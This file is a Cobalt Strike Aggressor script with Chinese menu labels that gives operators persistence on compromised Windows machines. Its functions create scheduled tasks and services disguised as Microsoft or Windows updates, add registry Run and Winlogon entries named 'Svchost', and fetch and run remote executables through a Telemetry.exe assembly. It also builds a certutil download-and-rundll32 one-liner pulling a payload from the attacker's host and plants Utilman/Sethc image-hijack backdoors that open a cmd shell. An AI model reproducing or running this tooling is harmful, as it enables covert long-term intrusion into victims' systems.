menu "权限维持" {
    menu "计划任务" {
        item "创建计划任务(报毒)" {
            $bid = $1;
            $dialog = dialog("计划任务", %(name => "Microsoft-Update", sc => "Hourly", tr => "", ru => "system", bid => $bid ), &scheduled);
            dialog_description($dialog, "创建计划任务用于权限维持");
            drow_text($dialog, "name", "定时任务名称：");
            drow_text($dialog, "tr", "程序路径：");
            drow_combobox($dialog, "sc", "定时", @("Hourly","Onlogon","Onstart", "Onidle"));
            drow_combobox($dialog, "ru", "权限", @("system","%USERNAME%"));
            dbutton_action($dialog, "确定");
            dialog_show($dialog);
        }
        sub scheduled {
            blog($bid, "--------------------------------------------------创建计划任务------------------------------------------------------------------");
            blog($bid, "计划任务名称：".$3['name']);
            blog($bid, "时间：".$3['sc']);
            blog($bid, "程序：".$3['tr']);
            blog($bid, "权限：".$3['ru']);
            bshell($bid, "schtasks /create /tn $3['name'] /sc $3['sc'] /mo 1 /tr $3['tr'] /ru $3['ru'] /f");
        }
        item "查询所有计划任务" {
            blog($1, "-------------------------------------------------------------查询所有计划任务-------------------------------------------------------------");
            bshell($1, "schtasks /query");
        }
        item "查询指定计划任务" {
            blog($1, "-------------------------------------------------------------查询指定计划任务-------------------------------------------------------------");
            prompt_text("计划任务名称：", "Microsoft-Update", lambda({ bshell(@ids, "schtasks /query | findstr $1"); }, @ids => $1));
        }
        item "启动计划任务" {
            blog($1, "-------------------------------------------------------------启动计划任务-------------------------------------------------------------");
            prompt_text("计划任务名称：", "Microsoft-Update", lambda({ bshell(@ids, "schtasks /run /i /tn $1"); }, @ids => $1));
        }
        item "删除计划任务" {
            blog($1, "-------------------------------------------------------------删除计划任务-------------------------------------------------------------");
            prompt_text("计划任务名称：", "Microsoft-Update", lambda({ bshell(@ids, "schtasks /delete /tn $1 /f"); }, @ids => $1));
        }
    }
    menu "注册服务自启(报毒)"{
        item "注册服务"{
            blog($1, "---------------------------------------------------------通过注册服务实现自启动权限维持--------------------------------------------------------");
            $bid = $1['@'];
            $Dialog = dialog("Registration service",%(SerName => "WindowsUpdate", Path => "",bid => $bid),&InstallService);
            dialog_description($Dialog, "将可执行文件注册为服务");
            drow_text($Dialog, "SerName", "Service Name: ");
            drow_text($Dialog, "Path", "Bin Path: ");
            dbutton_action($Dialog, "Install");
            dialog_show($Dialog);
        }
        sub InstallService{
            local('$Name $Path');
            $Name = $3['SerName'];
            $Path = replace($3['Path'], "\"", "");
            bshell($bid, "sc create \" $+ $Name\" binpath= \"cmd /c start \" $+ $Path\"\"&&sc config \" $+ $Name\" start= auto&&net start   $+ $Name");
        }
        item "查询服务"{
            blog($1, "---------------------------------------------------------查询服务--------------------------------------------------------");
            prompt_text("输入服务名称：", "WindowsUpdate", lambda({ bshell(@ids, "sc query $1"); }, @ids => $1));
        }
        item "删除服务"{
            blog($1, "---------------------------------------------------------删除服务--------------------------------------------------------");
            prompt_text("输入服务名称：", "WindowsUpdate", lambda({ bshell(@ids, "sc delete $1"); }, @ids => $1));
        }
    }
    menu "注册表添加启动项(报毒)"{
        item "添加注册表启动项"{
               if (!-isadmin $1['@']){
                   show_error("权限不足");
               }
               else{
                   $bid = $1['@'];
                   $Dialog = dialog("Auto Run",%(RegKey => "HKLM", RegItem => "Run", CallBackFile => "",bid => $bid),&InstallAutoRun);
                   dialog_description($Dialog, "注册表添加启动项");
                   drow_combobox($Dialog, "RegKey", "Key: ", @("HKLM", "HKCU"));
                   drow_combobox($Dialog, "RegItem", "RegItem: ", @("Run", "RunOnce", "RunOnceEx", "Winlogon", "Logon Scripts"));
                   drow_text($Dialog, "CallBackFile", "CallBackFile: ");
                   dbutton_action($Dialog, "Reg");
                   dialog_show($Dialog);
               }
           }
           sub InstallAutoRun{
               blog($bid, "---------------------------------------------------------通过注册表添加启动项实现自启动权限维持------------------------------------------");
               local('$Prefix $File $Key $Item $Reg');
               $Prefix = "\\Software\\Microsoft\\Windows\\CurrentVersion\\";
               $File = replace($3['CallBackFile'], "\"", "");
               $Key = "\"".$3['RegKey'];
               $Item = $3['RegItem']."\"";
               if($3['RegItem'] eq "Winlogon"){
                   $Prefix = replace($Prefix,'Windows',"Windows NT");
                   $Reg = $Key.$Prefix.$Item;
                   bshell($bid,"reg add  $+ $Reg /v Userinit /t REG_SZ /d \" C:\\Windows\\system32\\userinit.exe, $+ $File \" /f ");
               }
               else if($3['RegItem'] eq "Logon Scripts"){
                   bshell($bid,"reg add  \"HKCU\\Environment\" /v UserInitMprLogonScript /t REG_SZ /d \" $+ $File \" /f ");
               }
               else{
                   $Reg = $Key.$Prefix.$Item;
                   bshell($bid,"reg add  $+ $Reg /f");
                   bshell($bid,"reg add  $+ $Reg /v Svchost /t REG_SZ /d \" $+ $File \" /f ");
                   bshell($bid,"reg query  $+ $Reg /v Svchost");
               }
           }
        item "查询注册表启动项" {
            $bid = $1['@'];
            $Dialog = dialog("查询注册表启动项",%(RegKey => "HKLM", RegItem => "Run", bid => $bid),&SearchAutoRun);
            dialog_description($Dialog, "查询注册表启动项");
            drow_combobox($Dialog, "RegKey", "Key: ", @("HKLM", "HKCU"));
            drow_combobox($Dialog, "RegItem", "RegItem: ", @("Run", "RunOnce", "RunOnceEx", "Winlogon", "Logon Scripts"));
            dbutton_action($Dialog, "Reg");
            dialog_show($Dialog);
        }
        sub SearchAutoRun{
            blog($bid, "---------------------------------------------------------查询注册表启动项------------------------------------------");
            bshell($bid,"reg query $3['RegKey']\\Software\\Microsoft\\Windows\\CurrentVersion\\$3['RegItem'] /v Svchost")
        }
        item "删除注册表启动项" {
            $bid = $1['@'];
            $Dialog = dialog("删除注册表启动项",%(RegKey => "HKLM", RegItem => "Run", bid => $bid),&DeleteAutoRun);
            dialog_description($Dialog, "删除注册表启动项");
            drow_combobox($Dialog, "RegKey", "Key: ", @("HKLM", "HKCU"));
            drow_combobox($Dialog, "RegItem", "RegItem: ", @("Run", "RunOnce", "RunOnceEx", "Winlogon", "Logon Scripts"));
            dbutton_action($Dialog, "删除");
            dialog_show($Dialog);
        }
        sub DeleteAutoRun{
            blog($bid, "---------------------------------------------------------删除注册表启动项------------------------------------------");
            bshell($bid,"reg delete $3['RegKey']\\Software\\Microsoft\\Windows\\CurrentVersion\\$3['RegItem'] /v Svchost /f")
        }
    }
	menu "\"遥测\"计划任务" {
		item "无文件执行命令" {
			$bid = $1['@'];
			$dialog = dialog("Telemetry", %(command => "",bid => $bid), &Telemetry_cmd);
			dialog_description($dialog, "输入cmd命令，cmd /s 后面的内容，执行方式：Telemetry.exe install /command:calc");
			drow_text($dialog, "command", "command:  ");	
			dbutton_action($dialog, "运行");
			dialog_show($dialog);
		}
		sub Telemetry_cmd {
				$arg = join('', @("install /command:",$3['command']));
				bexecute_assembly($bid, script_resource("/exe/Telemetry.exe"), $arg);
		}

		item "远程下载文件自启" {
			$bid = $1['@'];
			$dialog = dialog("Telemetry", %(url => "",bid => $bid), &Telemetry_url);
			dialog_description($dialog, "输入exe下载地址，执行方式：Telemetry.exe install /url:http://vps:8089/System.exe");
			drow_text($dialog, "url", "url:  ");	
			dbutton_action($dialog, "运行");
			dialog_show($dialog);
		}
		sub Telemetry_url {
				$arg = join('', @("install /url:",$3['url']));
				bexecute_assembly($bid, script_resource("/exe/Telemetry.exe"), $arg);
		}
	}
		
    item "CertUtil Web Delivery" {
    	local('$dialog %defaults');
    	%defaults["uri"]  = "/test.dll";
    	%defaults["host"] = localip();
    	%defaults["port"] = 80;
    	$dialog = dialog("CertUtil Web Delivery (Stageless)", %defaults, &stage_attack);
    	dialog_description($dialog, "生成payload使用ccertutil远程下载，然后使用rundll32.exe执行");
    	drow_text($dialog, "uri", "URI Path: ", 20);
    	drow_text($dialog, "host", "Local Host: ");
    	drow_text($dialog, "port", "Local Port: ");
    	drow_listener_stage($dialog, "listener", "Listener: ");
    	drow_checkbox($dialog, "x64", "x64: ", "Use x64 payload");
    	dbutton_action($dialog, "Launch");
    	dialog_show($dialog);
    }
    sub stage_attack {
        local('%options $script $url $arch');
        %options = $3;
        $arch = iff(%options["x64"] eq "true", "x64", "x86");
        artifact_stageless(%options["listener"], "dll", $arch, $null, $this);
        yield;
        $script = $1;
        $url = site_host(%options["host"], %options["port"], %options["uri"], $script, "automatic", "Scripted Web Delivery (CertUtil)"); 
        prompt_text("Copy/Paste One-liner: ", "powerpick certutil.exe -urlcache -split -f " . $url . " Adobedll.dll; rundll32.exe Adobedll.dll,StartW", {});
        show_message("Be aware of the default values in this script and change them! (Adobedll.dll, dll.txt)");
        elog("powerpick certutil.exe -urlcache -split -f " . $url . " Adobedll.dll; rundll32.exe Adobedll.dll,StartW");

    }
    item "映像劫持"{
        if (!-isadmin $1['@']){
            show_error("权限不足");
        }
        else{
            $bid = $1['@'];
            $Dialog = dialog("IFEO",%(Type => "Utilman", CallBackFile => "c:\\Windows\\system32\\cmd.exe",bid => $bid),&InstallBackDoor);
            dialog_description($Dialog, "使用映像劫持安装后门(IFEO)");
            drow_combobox($Dialog,"Type","Type: ", @("Utilman", "Sethc"));
            drow_text($Dialog,"CallBackFile","CallBackFile: ");
            dbutton_action($Dialog, "Run");
            dialog_show($Dialog); 
        }
    }
  
    sub InstallBackDoor{
        local('$Prefix $File');
        $Prefix = "\"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\";
        $File = replace($3['CallBackFile'], "\"", "");
        if ($3['Type'] eq "Utilman"){
            $Prefix = $Prefix."Utilman.exe\"";
            bshell($bid,"reg add  $+ $Prefix /f");
            bshell($bid,"reg add  $+ $Prefix /v Debugger /t REG_SZ /d \" $+ $File \" /f ");
        }
        else if($3['Type'] eq "Sethc"){
            $Prefix = $Prefix."Sethc.exe\"";
            bshell($bid,"reg add  $+ $Prefix /f");
            bshell($bid,"reg add  $+ $Prefix /v Debugger /t REG_SZ /d \" $+ $File \" /f ");
        }
    
    }
}